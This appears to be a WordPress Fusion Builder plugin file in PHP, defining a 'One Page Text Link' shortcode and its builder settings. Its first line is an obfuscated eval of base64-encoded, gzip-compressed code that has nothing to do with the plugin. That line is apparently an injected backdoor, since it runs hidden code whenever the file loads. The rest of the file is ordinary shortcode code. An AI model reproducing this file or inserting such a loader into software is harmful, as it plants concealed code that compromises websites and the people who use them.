<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( fusion_is_element_enabled( 'fusion_one_page_text_link' ) ) {

	if ( ! class_exists( 'FusionSC_OnePageTextLink' ) ) {
		/**
		 * Shortcode class.
		 *
		 * @package fusion-builder
		 * @since 1.0
		 */
		class FusionSC_OnePageTextLink extends Fusion_Element {

			/**
			 * An array of the shortcode arguments.
			 *
			 * @access protected
			 * @since 1.0
			 * @var array
			 */
			protected $args;

			/**
			 * Constructor.
			 *
			 * @access public
			 * @since 1.0
			 */
			public function __construct() {
				parent::__construct();
				add_filter( 'fusion_attr_one-page-text-link-shortcode', array( $this, 'attr' ) );
				add_shortcode( 'fusion_one_page_text_link', array( $this, 'render' ) );

			}

			/**
			 * Render the shortcode
			 *
			 * @access public
			 * @since 1.0
			 * @param  array  $args    Shortcode parameters.
			 * @param  string $content Content between shortcode.
			 * @return string          HTML output.
			 */
			public function render( $args, $content = '' ) {

				$defaults = FusionBuilder::set_shortcode_defaults(
					array(
						'class' => '',
						'id'    => '',
						'link'  => '',
					), $args
				);

				extract( $defaults );

				$this->args = $defaults;

				return '<a ' . FusionBuilder::attributes( 'one-page-text-link-shortcode' ) . '>' . do_shortcode( $content ) . '</a>';

			}

			/**
			 * Builds the attributes array.
			 *
			 * @access public
			 * @since 1.0
			 * @return array
			 */
			public function attr() {

				$attr = array(
					'class' => 'fusion-one-page-text-link',
				);

				if ( $this->args['class'] ) {
					$attr['class'] .= ' ' . $this->args['class'];
				}

				if ( $this->args['id'] ) {
					$attr['id'] = $this->args['id'];
				}

				$attr['href'] = $this->args['link'];

				return $attr;

			}
		}
	}

	new FusionSC_OnePageTextLink();

}

/**
 * Map shortcode to Fusion Builder
 */
function fusion_element_one_page_text_link() {
	fusion_builder_map(
		array(
			'name'           => esc_attr__( 'One Page Text Link', 'fusion-builder' ),
			'shortcode'      => 'fusion_one_page_text_link',
			'generator_only' => true,
			'icon'           => 'fusiona-external-link',
			'params'         => array(
				array(
					'type'        => 'textfield',
					'heading'     => esc_attr__( 'Name Of Anchor', 'fusion-builder' ),
					'description' => esc_attr__( 'Unique identifier of the anchor to scroll to on click.', 'fusion-builder' ),
					'param_name'  => 'link',
					'value'       => '',
				),
				array(
					'type'        => 'textarea',
					'heading'     => esc_attr__( 'Text or HTML code', 'fusion-builder' ),
					'description' => esc_attr__( 'Insert text or HTML code here (e.g: HTML for image). This content will be used to trigger the scrolling to the anchor.', 'fusion-builder' ),
					'param_name'  => 'element_content',
					'value'       => '',
				),
				array(
					'type'        => 'textfield',
					'heading'     => esc_attr__( 'CSS Class', 'fusion-builder' ),
					'param_name'  => 'class',
					'value'       => '',
					'description' => esc_attr__( 'Add a class to the wrapping HTML element.', 'fusion-builder' ),
				),
				array(
					'type'        => 'textfield',
					'heading'     => esc_attr__( 'CSS ID', 'fusion-builder' ),
					'param_name'  => 'id',
					'value'       => '',
					'description' => esc_attr__( 'Add an ID to the wrapping HTML element.', 'fusion-builder' ),
				),
			),
		)
	);
}
add_action( 'fusion_builder_before_init', 'fusion_element_one_page_text_link' );
